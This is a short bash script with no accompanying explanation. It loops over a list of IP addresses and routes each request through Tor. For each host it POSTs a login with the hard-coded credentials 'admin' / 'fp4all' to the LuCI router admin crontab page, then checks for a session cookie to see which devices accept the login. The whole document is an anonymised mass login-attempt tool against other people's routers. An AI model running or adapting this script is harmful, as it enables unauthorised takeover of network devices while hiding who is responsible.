cat "iplist" | while read line
do
echo $line
torify curl -sik -X POST $line'/cgi-bin/luci/admin/system/crontab' -d "username=admin&password=fp4all" | grep "Set-Cookie"
echo ""
echo "" 
done


